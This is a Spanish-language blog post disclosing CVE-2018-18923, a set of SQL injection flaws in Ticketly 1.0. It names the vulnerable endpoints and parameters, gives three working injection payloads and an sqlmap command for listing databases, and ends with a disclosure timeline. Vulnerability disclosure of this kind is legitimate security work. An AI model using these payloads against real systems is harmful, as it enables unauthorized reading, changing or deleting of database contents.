+++
date = "2018-11-05"
title = "CVE-2018-18923 Ticketly 1.0 - Múltiples SQL Injections"
author = "Javier Olmedo"
toc = false
+++

En la [entrada anterior](https://hackpuntes.com/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador/), hemos visto una vulnerabilidad de [Escalación de Privilegios](https://www.owasp.org/index.php/Testing_for_Privilege_escalation_\(OTG-AUTHZ-003\)) en [Ticketly 1.0](https://abisoftgt.net/software/6/sistema-de-tickets-y-soporte-con-php-y-mysql), en esta entrada, vamos a ver otras vulnerabilidades que he encontrado en este software, en concreto, múltiples SQL Injections, estas vulnerabilidades han sido asociadas al [CVE-2018-18923](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-18923).

## Ticketly - CVE-2018-18923

### Ticketly 1.0 - Multiple SQL Injections

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_001.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_001.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_001.png)

Ticketly 1.0, es un software de ticketing desarrollado por AbiSoft para ofrecer soporte a los usuarios sobre incidencias en los sistemas, está basado en PHP y MySQL.

- 📅 Vulnerabilidad descubierta por [Javier Olmedo](https://twitter.com/JJavierOlmedo) el **24/07/2018**
- 💣 Publicada el **05/11/2018**
- 🐛 [CVE-2018-18923](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18923)
- 🔗 Link del software [Ticketly](https://abisoftgt.net/software/6/sistema-de-tickets-y-soporte-con-php-y-mysql)
- 🐞 Versión vulnerable = **1.0**

## Vector de ataque / Criticidad de la explotación

### CRITICIDAD - 🟣 CRÍTICA 🟣

A través de las vulnerabilidades [SQL Injection](https://www.owasp.org/index.php/SQL_Injection), un usuario malintencionado podría **leer, modificar o borrar** información de la base de datos que utiliza la aplicación, **lanzar comandos al sistema operativo o** causar una [denegación de servicio](https://es.wikipedia.org/wiki/Ataque_de_denegaci%C3%B3n_de_servicio) con el objetivo de **obtener información confidencial, escalar privilegios o dejar inoperativa la aplicación.**

## Parámetros / Recursos vulnerables

En los siguiente recursos se han encontrado parámetros vulnerables a ataques SQL Injection a través de peticiones POST, estas peticiones permiten las condiciones `WHERE`, `HAVING`, `ORDER BY` y `GROUP BY`, lo que permite que sean **fácilmente explotables** y **recuperar grandes cantidades de información** de la base de datos con una sola consulta.

`/action/addproject.php`

Parámetros `description`, `name`, `category_id` y `description`

`/action/addticket.php`

Parámetros `king_id`, `priority_id`, `project_id`, `status_id` y `title`

`/reports.php`

Parámetros `kind_id` y `status_id`

**💉 Payload 1 (boolean-based blind)**

```txt
name=Test» RLIKE (SELECT (CASE WHEN (4632=4632) THEN 0x54657374 ELSE 0x28 END)) AND «lrmZ»=»lrmZ&description=Test
```

**💉 Payload 2 (error-based)**

```txt
name=Test» AND EXTRACTVALUE(9139,CONCAT(0x5c,0x7176766a71,(SELECT (ELT(9139=9139,1))),0x7178717a71)) AND «SZJL»=»SZJL&description=Test
```

**💉 Payload 3 (AND/OR time-based blind)**

```txt
name=Test» RLIKE SLEEP(5) AND «WkTS»=»WkTS&description=Test
```

📷 **Captura de pantalla de SQLmap lanzando el comando**

```bash
sqlmap -r poc.req -p name --dbs
```

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_002.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_002.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_002.png)

## Prueba de concepto (PoC)

**1.**  Si añadimos el caracter `'` `(%22)` en el parámetro `name` obtenemos un **error en la aplicación**

**1.1 Petición**

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_003.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_003.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_003.png)

**1.2 Respuesta**

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_004.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_004.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_004.png)

**2.** En cambio, al añadir dos `'` `(%22%22)`, obtenemos un **código 200 OK**

**2.1 Petición**

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_005.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_005.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_005.png)

**2.2 Respuesta**

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_006.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_006.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_006.png)

## Timeline

- **24/07/2018** Descubrimiento de la vulnerabilidad
- **24/07/2018** Contacto con el desarrollador
- **24/07/2018** El desarrollador marca la vulnerabiliad como pendiente de parcheo
- **02/11/2018** Solicito CVE
- **04/11/2018** Asignación de CVE-2018-18923 por MITRE
- **05/11/2018** Hago pública la vulnerabilidad

## Referencias

- CVE-MITRE - [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18923](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18923)

Un saludo a todos!! 👋